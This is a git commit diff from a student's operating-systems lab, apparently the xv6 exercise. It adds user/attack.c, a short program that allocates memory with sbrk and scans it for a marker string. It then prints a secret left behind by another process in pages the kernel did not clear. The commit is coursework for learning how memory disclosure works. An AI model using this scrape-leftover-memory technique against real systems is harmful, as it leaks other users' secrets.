58a981b7dedac49964ea0a3df6fe63192f055e57
arazm <arazm21@freeuni.edu.ge>
2024-10-04 14:48:22 +0400

    ready to submit my lab

--- user/attack.c
+++ user/attack.c
@@ -5,9 +5,47 @@
 
 int
 main(int argc, char *argv[])
-{
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
+{   
+    // char str[2];
+    // str[1] = '\0';
+    int bufferLength = 2048*8*16;
+    char* buffer = sbrk(bufferLength); 
+    //int found = 0;
+    //int startWriting = 0;
+    //char secret[100];
+    char startOfString[]="very very";
 
-  exit(1);
+     
+        // memmove(secret,&buffer[32],8);
+        // // secret[8] = '\0';
+
+        // write(2, secret, 9);
+        // exit(0);
+      
+
+    for(int i = 0; i < bufferLength; i++){
+       //str[0]=buffer[i];
+       //printf("%s",str);
+      // if(found==1 && buffer[i]!=' ')startWriting=1;
+      // if(buffer[i] == ':')found = 1;
+      // if(startWriting == 1){
+      //   memcpy(secret,&buffer[i],8);
+      //   secret[8] = '\0';
+
+      //   write(2, secret, 8);
+      //   break;
+      // }
+      int res=memcmp(startOfString,&buffer[i],8);
+      if(res==0){
+        //printf("fffffffffffff");
+        char secret[8] ;
+        memmove(secret,&buffer[i+32-8],8);
+        secret[7]='\0';
+        write(2, secret, 8);
+        //printf("%s",secret);
+      }
+        
+    }
+    
+    exit(0);
 }
